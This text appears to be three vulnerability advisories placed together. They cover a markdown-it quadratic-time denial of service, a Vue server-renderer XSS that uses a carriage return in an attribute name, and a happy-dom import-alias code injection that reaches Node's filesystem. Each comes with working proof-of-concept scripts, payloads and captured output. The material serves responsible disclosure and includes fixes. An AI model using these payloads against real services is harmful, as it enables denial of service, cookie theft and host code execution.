advisory.overview:
### Summary

A link reference definition whose label or title is never closed is O(n²) in markdown-it 15.0.2 with default options. Continuation lines are pulled lazily with str += lineContent in src/rules_block/reference.ts, and the subsequent charCodeAt and slice calls flatten the V8 cons-string, copying everything collected so far; this runs before the rule decides the definition is invalid. It is a regression introduced by PR #1004 in 14.0.0: 13.0.2 processed a 313 KB input in 125 ms, while every version since takes about 11 seconds on the same input. At the sizes below, 200 KB takes 3.6 seconds, 400 KB takes 18.1 seconds, and 800 KB takes 74.0 seconds, which is roughly 4–5× per doubling. No options are required to trigger it.

### Details

src/rules_block/reference.ts appends continuation lines with str += lineContent at lines 74, 83, 100, 133, and 150, then keeps indexing the accumulated string via str.charCodeAt(pos) in the label and whitespace loops and str.slice(...) in parseLinkTitle. V8 represents += as a cons-string, and the next charCodeAt or slice flattens it, copying everything collected so far, so one definition spanning n lines costs O(n²). Isolation confirms the rule is responsible: block-only parsing with inline disabled is still quadratic, md.disable('reference') makes the same input linear, and the same text without the leading [ is linear. The fix is to track positions in state.src instead of building str, or to collect line slices in an array and parse across them. At minimum, stop scanning the label after 999 characters (CommonMark §6.3) before pulling more lines, and cap title continuation. Add a pathological test with a 100k-line unclosed title and label. Open PR #1215 edits the same file but its label check runs after the label loop, so it does not bound either variant and the fix can land together with that PR.

The observed output from PoC was:
unclosed title n=100000   200009 B    3585.5 ms
unclosed title n=200000   400009 B   18107.1 ms   (5.05x)
unclosed title n=400000   800009 B   73954.4 ms   (4.08x)

Regression comparison at 313 KB: 13.0.2 → 125 ms, 14.1.0 → 11.4 s, 15.0.0 → 10.6 s, 15.0.2 → 10.7 s.

### Proof of concept

How to execute the PoC:
1. mkdir -p markdown-it-poc && cd markdown-it-poc
2. npm init -y
3. npm i markdown-it@15.0.2
4. node poc_markdown_it.js

PoC below is:
```javascript
// poc_markdown_it.js
// Requires: npm install markdown-it@15.0.2
const MarkdownIt = require('markdown-it');
const md = new MarkdownIt();

function bench(label, src) {
  const t0 = process.hrtime.bigint();
  md.render(src);
  const t1 = process.hrtime.bigint();
  console.log(
    `${label.padEnd(30)} ${String(src.length).padStart(9)} B ${(Number(t1 - t0) / 1e6).toFixed(1).padStart(9)} ms`
  );
}

// Unclosed title: one reference definition spread over many lines
for (const n of [100000, 200000, 400000]) {
  bench(`unclosed title n=${n}`, '[a]: /u "' + 'x\n'.repeat(n));
}

// Unclosed label
for (const n of [5000, 10000, 20000]) {
  bench(`unclosed label n=${n}`, '[' + 'a\n'.repeat(n));
}
```

### Impact

This is an algorithmic-complexity denial of service (CWE-407). Any server that renders user Markdown with markdown-it is affected with default options, including comments, issues, chat, wikis, docs previews, and LLM chat UIs. A ~400 KB request body blocks the Node.js event loop for about 18 seconds and an ~800 KB body for about 74 seconds. This is the same class and attacker model as GHSA-253c, but it is reachable without any opt-in option, since the affected path is a core block rule.

## Description

`@vue/server-renderer` was investigated specifically because it's the one place in Vue where template rendering output becomes a real HTTP response body -- a genuine server-side trust boundary, unlike client-side rendering which only ever affects the same browser session that's already running the app's own JS.

`ssrRenderAttrs()` (in `packages/server-renderer/src/helpers/ssrRenderAttrs.ts`) is what compiled SSR output calls for something like `<div v-bind="userObject">`. It loops over the object's own keys and, for each one, renders it as an HTML attribute:

```ts
export function ssrRenderDynamicAttr(
  key: string,
  value: unknown,
  tag?: string,
): string {
  if (!isRenderableAttrValue(value)) {
    return ``
  }
  const attrKey = ...
  if (isBooleanAttr(attrKey) || ...) {
    return includeBooleanAttr(value) ? ` ${attrKey}` : ``
  } else if (isSSRSafeAttrName(attrKey)) {
    return value === '' ? ` ${attrKey}` : ` ${attrKey}="${escapeHtml(value)}"`
  } else {
    console.warn(`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${attrKey}`)
    return ``
  }
}
```

The value always goes through `escapeHtml()` -- that part is correctly and consistently applied everywhere in this file. But the attribute name (`attrKey`) is only checked against a character blacklist, then spliced directly into the output with no escaping of its own:

```ts
// packages/shared/src/domAttrConfig.ts
const unsafeAttrCharRE = /[>/="'\u0009\u000a\u000c\u0020]/

export function isSSRSafeAttrName(name: string): boolean {
  if (attrValidationCache.hasOwnProperty(name)) {
    return attrValidationCache[name]
  }
  const isUnsafe = unsafeAttrCharRE.test(name)
  if (isUnsafe) {
    console.error(`unsafe attribute name: ${name}`)
  }
  return (attrValidationCache[name] = !isUnsafe)
}
```

That blacklist covers: `>`, `/`, `=`, `"`, apostrophe, tab (U+0009), line feed (U+000A), form feed (U+000C), and space (U+0020). It does not cover U+000D -- carriage return (CR, written as `\r` in JS).

That matters because of how browsers actually parse HTML. Per the WHATWG HTML parsing spec, the very first step ("preprocessing the input stream") converts every `\r` not followed by `\n` into a `\n` before the tokenizer even starts. So a raw `\r` sitting inside what Vue intends as a single attribute name gets turned into a real line feed by the browser -- and a line feed is one of the characters that terminates an attribute name and starts a new one. The blacklist checks the string as Vue sees it before the browser gets to reinterpret it, and that's exactly the gap.

Below is a fresh clone of this repo, confirming the exact commit, the exact vulnerable line, and zero modification to the source:

<img width="781" height="336" alt="poc1" src="https://github.com/user-attachments/assets/f4b92955-9a8f-4700-8c51-38ee46912de8" />

## Prrof

The real, unmodified  ssrRenderAttrs()  from the published  @vue/server-renderer@3.5.41  package was tested. The source at HEAD and the upcoming  v3.6.0-rc.2  tag were also checked, and the same vulnerable regular expression was present in both; no branch containing a fix was identified.

Full script, saved as `poc.mjs` (GitHub doesn't let me attach `.mjs` directly, so the complete file is here):

```js
import { ssrRenderAttrs } from '@vue/server-renderer';
import { parseFragment } from 'parse5';

// This is exactly what compiled SSR output calls for `<div v-bind="userObject">`
// -- the real, unmodified, published ssrRenderAttrs function.
// Full attack chain: the key itself contains ONLY letters, digits, and a
// bare \r (carriage return) -- no '>', '/', '=', '"', "'", tab, LF, FF, or
// space anywhere, so isSSRSafeAttrName() considers it fully safe. The value
// is attacker-controlled JavaScript, delivered as the genuine value of the
// LAST \r-separated fragment, which Vue's own template naturally appends via
// `="${escapeHtml(value)}"` immediately after the key.
const maliciousKey = 'x\rautofocus\ronfocus';
const props = {
  [maliciousKey]: 'alert(document.cookie)',
};

const rawAttrString = ssrRenderAttrs(props);
console.log('=== Raw string produced by the real ssrRenderAttrs() ===');
console.log(JSON.stringify(rawAttrString));
console.log();
console.log('=== As it would literally appear in the HTML response ===');
console.log(rawAttrString.replace(/\r/g, '\\r').replace(/\n/g, '\\n\n'));

const fullHtml = `<div${rawAttrString}>content</div>`;
console.log();
console.log('=== Full element HTML ===');
console.log(JSON.stringify(fullHtml));

// Now parse this EXACT output with parse5 -- a real, spec-compliant HTML5
// parser (the same parsing algorithm real browsers implement, including the
// \r\n -> \n input-preprocessing normalization step).
const fragment = parseFragment(fullHtml);
const div = fragment.childNodes.find(n => n.tagName === 'div');
console.log();
console.log('=== How a real HTML5 parser (parse5) actually interprets this ===');
console.log('Attributes parsed on the <div>:');
for (const attr of div.attrs) {
  console.log(`  ${JSON.stringify(attr.name)} = ${JSON.stringify(attr.value)}`);
}

const injectedHandler = div.attrs.find(a => a.name === 'onfocus');
const injectedAutofocus = div.attrs.find(a => a.name === 'autofocus');
console.log();
if (injectedHandler && injectedAutofocus) {
  console.log('*** CONFIRMED: real, separate "autofocus" and "onfocus" attributes were parsed out ***');
  console.log(`*** onfocus value: ${JSON.stringify(injectedHandler.value)} ***`);
  console.log('*** This element will execute the attacker JS automatically on page load, no user interaction needed. ***');
} else {
  console.log('Not confirmed.');
}
```

This is a fresh `npm install vue@3.5.41 @vue/server-renderer@3.5.41 parse5` -- the real, currently-published packages, not anything modified:

<img width="831" height="531" alt="poc2" src="https://github.com/user-attachments/assets/ea350948-4c93-45a3-b21a-f21dc7f90d29" />

Real, captured output:

```
=== Raw string produced by the real ssrRenderAttrs() ===
" x\rautofocus\ronfocus=\"alert(document.cookie)\""

=== Full element HTML ===
"<div x\rautofocus\ronfocus=\"alert(document.cookie)\">content</div>"

=== How a real HTML5 parser (parse5) actually interprets this ===
Attributes parsed on the <div>:
  "x" = ""
  "autofocus" = ""
  "onfocus" = "alert(document.cookie)"

*** CONFIRMED: real, separate "autofocus" and "onfocus" attributes were parsed out ***
*** onfocus value: "alert(document.cookie)" ***
```

<img width="834" height="897" alt="poc3" src="https://github.com/user-attachments/assets/a92f9c5b-e30d-4968-9ec1-8969628c6437" />
<img width="834" height="896" alt="poc4" src="https://github.com/user-attachments/assets/a397cd3f-8eb3-49af-9604-a31a8bcdb2ea" />

The single attribute name Vue intended to render safely -- `x\rautofocus\ronfocus` -- gets parsed by any real browser as three separate things: an empty `x` attribute, a real `autofocus` boolean attribute, and a real `onfocus="alert(document.cookie)"` event handler. `autofocus` means the element receives focus automatically on page load, which fires the `focus` event immediately, which runs the injected JavaScript -- no click, no hover, no user interaction of any kind required.

This behavior was confirmed not to be specific to the payload by first isolating the mechanism with a minimal case (`"foo\rbar"` as the key, no other special characters at all), which parse5 also split into two genuine separate attributes (`foo=""` and `bar="..."`), before building the full self-triggering payload above.

To go beyond the parser-level proof, there is a second script that calls the real `ssrRenderAttrs()`, captures its exact return value programmatically, and writes that unmodified byte sequence directly into an HTML file on disk -- no HTML was hand-typed anywhere in this step. Full script, saved as `generate_real_poc.mjs`:

```js
import { ssrRenderAttrs } from '@vue/server-renderer';
import fs from 'fs';

// This is the ACTUAL, unmodified ssrRenderAttrs() from the real, installed
// @vue/server-renderer@3.5.41 -- nothing hand-typed below this line is HTML,
// it is Vue's own function's real return value, captured programmatically.
const maliciousKey = 'x\rsrc\ronerror';
const props = { [maliciousKey]: 'alert("REAL Vue SSR output executed this -- cookie: " + document.cookie)' };

const vueOutput = ssrRenderAttrs(props);

console.log('=== Vue\'s real ssrRenderAttrs() returned exactly this string ===');
console.log(JSON.stringify(vueOutput));

// Build the full page around Vue's UNMODIFIED output -- the <img ...> tag
// content between the angle brackets is copied byte-for-byte from vueOutput,
// not retyped.
const html = `<!DOCTYPE html>
<html>
<head><title>Vue SSR PoC -- byte-for-byte Vue output</title></head>
<body>
<h3>Everything inside the &lt;img&gt; tag below was written to this file
programmatically from the real return value of <code>ssrRenderAttrs()</code>
in the actual installed <code>@vue/server-renderer@3.5.41</code> package.
No HTML was hand-typed for the tag itself.</h3>
<p>Exact JSON-escaped string Vue's function returned (see generate_real_poc.mjs, run right before this file was written):</p>
<pre id="vue-output-proof">${vueOutput.replace(/</g, '&lt;')}</pre>
<hr>
<img${vueOutput}>
</body>
</html>
`;

const outPath = '/Users/onevilx/Desktop/vue-ssr-xss-poc-real.html';
fs.writeFileSync(outPath, html);
console.log('\nWrote', outPath);
console.log('Bytes inside the <img...> tag are Vue\'s real, unmodified return value.');
```

Opening that generated file in a real browser fires the payload automatically:

<img width="1666" height="449" alt="poc5" src="https://github.com/user-attachments/assets/251bd830-634f-4cd0-bf79-849bbc07ec9a" />

Dev tools on that same page confirm the browser genuinely parsed three separate attributes (`x`, `src`, `onerror`), matching the on-page proof text that was written directly from Vue's real return value:

<img width="1348" height="400" alt="poc6" src="https://github.com/user-attachments/assets/b19d6ff0-ecaa-45f3-9149-9f3d0d4faacb" />

Whether this affects client-side (non-SSR) Vue rendering was also checked: it doesn't, and I want to be upfront about that limit too. Client-side Vue sets dynamic attributes via the DOM `setAttribute()` API, which validates the name against the HTML QName grammar and throws a `DOMException` for characters like `"` (I found an existing, unrelated open issue -- #13944 -- that confirms this behavior). That's a fundamentally different code path with its own validation, and I have not found a way to reach this specific bug through it. This is specifically and only an `@vue/server-renderer` (SSR) issue.

## Impact

This requires an application to bind an object whose keys (not just values) come from a source the developer doesn't fully control, via `v-bind="object"` or the equivalent compiled form. I want to be honest about how common that is: binding untrusted values into attributes is the standard, everyday Vue pattern that's already safely handled by `escapeHtml()`. Binding untrusted keys is less universal, but it's a real, documented, supported Vue feature, not a misuse of the framework -- and it's exactly the scenario `isSSRSafeAttrName()` exists to defend, which tells me it's already inside your own threat model for this file, just not fully closed. Realistic examples: a CMS or form-builder feature where field/attribute names are configurable by a less-trusted role and gets rendered via SSR to other users; a component that spreads a validated-elsewhere config object onto a root element; any dynamic-attributes helper that takes a plain object where both keys and values may originate from external data (a database record, an API response, a query string parsed into an object).

Where it's reachable, the impact is a complete, self-triggering stored XSS in server-rendered HTML -- the injected `autofocus`/`onfocus` payload runs the moment the page loads, for every visitor who receives that server-rendered output, with no interaction needed. That's a real trust-boundary break in a security-relevant helper whose entire job is making data safe to render.

## Suggested fix

Add U+000D (carriage return) to `unsafeAttrCharRE` in `packages/shared/src/domAttrConfig.ts`:

```ts
const unsafeAttrCharRE = /[>/="'\u0009\u000a\u000c\u000d\u0020]/
```

Double-checking against the full WHATWG "ASCII whitespace" definition (tab, LF, FF, CR, space -- all five) rather than enumerating characters one at a time would help, since that's exactly the kind of list that's easy to leave a gap in, which is what happened here.

## Summary

The ESM compiler in `happy-dom@20.14.5` does not validate imported local binding aliases before interpolating them into generated JavaScript.

As a result, an invalid ESM import alias can be transformed into a valid JavaScript destructuring default initializer and executed.

This appears to be an alternate injection path and incomplete remediation of GHSA-6q6h-j7hj-3r64 / CVE-2026-33943. The previous fix validates `importName` in the local `export { ... }` handler, but the named import handler still places an unvalidated `alias` directly into code context.

These issues were confirmed through the public `Window` and `<script type="module">` APIs using the published `happy-dom` npm package. The PoC reaches the Node.js host `process`, obtains `node:fs`, and creates a proof directory on the host filesystem.

## Confirmed affected versions

The PoC was directly tested against:

- `happy-dom@17.0.0`
- `happy-dom@20.0.0`
- `happy-dom@20.1.0`
- `happy-dom@20.14.5`

The same PoC does not trigger on `happy-dom@16.8.1`.

The ESM compiler was introduced by commit `7bc831df2`, first released in `v17.0.0`. The vulnerable interpolation remains present through `v20.14.5`, the latest release at the time of testing.

Suggested affected range:

```text
>= 17.0.0, <= 20.14.5
```

No patched version is currently available.

## Preconditions

- JavaScript evaluation is enabled with `enableJavaScriptEvaluation: true`.
- Attacker-controlled HTML or module source is processed by Happy DOM.
- This may affect SSR, preview, scraping, or testing services that evaluate externally supplied HTML.

## Technical details

In `packages/happy-dom/src/module/ECMAScriptModuleCompiler.ts`, the named import handler splits an import specifier and extracts its alias:

```ts
const nameParts = part.trim().split(/\s+as\s+/);
const alias = (nameParts[1] || nameParts[0]).replace(/["']/g, '');
const name = nameParts[0].replace(/["']/g, '');

if (alias && name) {
  properties.push({ name, alias });
}
```

Unlike the patched `export { ... }` handler, the value of `alias` is not validated as a JavaScript identifier.

It is subsequently inserted directly into generated binding syntax:

```ts
newCodeStart += `let {${properties
  .map((property) =>
    property.alias
      ? `"${property.name}": ${property.alias}`
      : property.name
  )
  .join(', ')}} = $happy_dom.imports.get('${url}')${match[8]}`;
```

Consider the following source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

This is invalid ECMAScript module syntax. Node.js rejects it at the `=` token.

Happy DOM instead transforms it into the equivalent of:

```js
let {
  "missing": injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} = $happy_dom.imports.get('https://poc.local/dep.json');
```

This generated JavaScript is valid. Because the imported JSON object does not contain a `missing` property, the default initializer executes.

The `with { type: 'json' }` attribute is relevant because the compiler only generates its circular import resolver for ESM imports:

```ts
if (!match[7] || match[7] === 'esm') {
  resolvableCircularImports.push({ url, properties });
}
```

Using a JSON module prevents the malicious alias from being emitted again in a later circular-import assignment, leaving the generated function syntactically valid.

Backtick strings also survive the existing quote removal. This allows the injected initializer to reach Node.js host APIs:

```js
globalThis.constructor.constructor(`return process`)()
  .getBuiltinModule(`node:fs`)
  .mkdirSync(
    globalThis.constructor.constructor(`return process`)().cwd() +
      `/HAPPY_DOM_RCE_PROOF`
  )
```

## Proof of concept

The following PoC uses only the public Happy DOM API and performs a harmless filesystem action by creating a directory named `HAPPY_DOM_RCE_PROOF`.

### 1. Create `package.json`

```json
{
  "name": "happy-dom-import-alias-rce-poc",
  "private": true,
  "type": "module",
  "dependencies": {
    "happy-dom": "20.14.5"
  }
}
```

### 2. Create `dep.json`

```json
{}
```

### 3. Create `payload.mjs`

This file is used as a control to demonstrate that a native ECMAScript parser rejects the source:

```js
import {
  missing as injected = globalThis.__HAPPY_DOM_PWNED__ = 1337
} from './dep.json' with { type: 'json' };
```

### 4. Create `poc.mjs`

```js
import { Window } from 'happy-dom';
import { existsSync, rmSync } from 'node:fs';
import { resolve } from 'node:path';

const proofDirectory = resolve('HAPPY_DOM_RCE_PROOF');
rmSync(proofDirectory, { recursive: true, force: true });

const window = new Window({
  url: 'https://poc.local/',
  settings: {
    enableJavaScriptEvaluation: true,
    suppressCodeGenerationFromStringsWarning: true,
    fetch: {
      virtualServers: [
        {
          url: 'https://poc.local/',
          directory: process.cwd()
        }
      ]
    }
  }
});

const script = window.document.createElement('script');
script.type = 'module';

script.textContent = `
  import {
    missing as injected = globalThis.constructor.constructor(\`return process\`)()
      .getBuiltinModule(\`node:fs\`)
      .mkdirSync(
        globalThis.constructor.constructor(\`return process\`)().cwd() +
        \`/HAPPY_DOM_RCE_PROOF\`
      )
  } from './dep.json' with { type: 'json' };
`;

window.document.body.appendChild(script);
await window.happyDOM.waitUntilComplete();

if (!existsSync(proofDirectory)) {
  console.error('[-] Exploit failed: proof directory was not created.');
  console.error(
    window.happyDOM.virtualConsolePrinter.readAsString()
  );
  process.exitCode = 1;
} else {
  console.log(`[+] Host filesystem reached: ${proofDirectory}`);
}

await window.happyDOM.close();
```

### 5. Run the control test

```console
npm install
node --check payload.mjs
```

Expected result:

```text
SyntaxError: Unexpected token '='
```

This confirms that the source is not valid ESM.

### 6. Run the Happy DOM PoC

```console
node poc.mjs
```

Expected result:

```text
[+] Host filesystem reached: /path/to/HAPPY_DOM_RCE_PROOF
```

The existence of `HAPPY_DOM_RCE_PROOF` confirms that the expression injected through the import alias executed and reached the host filesystem.

The PoC was also verified inside a `node:24-alpine` Docker container, where it created:

```text
/poc/HAPPY_DOM_RCE_PROOF
```

## Impact

An attacker who can supply module source to an application that evaluates JavaScript through Happy DOM can cause syntactically invalid import declarations to be transformed into executable JavaScript.

This may bypass upstream syntax validation or application assumptions that malformed import clauses will be rejected.

The demonstrated payload reaches Node.js `process` and built-in modules. It can therefore be adapted to read or modify files, access environment data, or execute operating-system commands with the privileges of the Happy DOM host process.

## Relationship to CVE-2026-33943

CVE-2026-33943 covers expression injection through a local export declaration:

```js
export { attacker_expression }
```

Its fix added identifier validation to the `importName` used by the `export { ... }` handler:

```ts
if (
  exportName &&
  importName &&
  VALID_VARIABLE_NAME_REGEXP.test(importName)
) {
  // ...
}
```

This report uses a different parsing and code-generation path:

```js
import { name as malicious_alias } from './module';
```

The unvalidated value is the local import `alias`, and the injection occurs in a generated destructuring binding rather than the export assignment patched by CVE-2026-33943.

The issue remains reproducible in versions released after the CVE-2026-33943 fix, including `20.14.5`.

## Suggested fix

Validate the imported local binding before placing it into code context. The existing `VALID_VARIABLE_NAME_REGEXP` can be reused:

```diff
- if (alias && name) {
+ if (alias && name && VALID_VARIABLE_NAME_REGEXP.test(alias)) {
```

A regression test should compile and execute the malicious import declaration, then verify that the initializer was not evaluated.

This change was tested locally. The focused `ECMAScriptModuleCompiler` test suite passes with 30 tests, and ESLint reports no errors.

For additional hardening, generated property keys should use `JSON.stringify()` instead of manual quote interpolation.

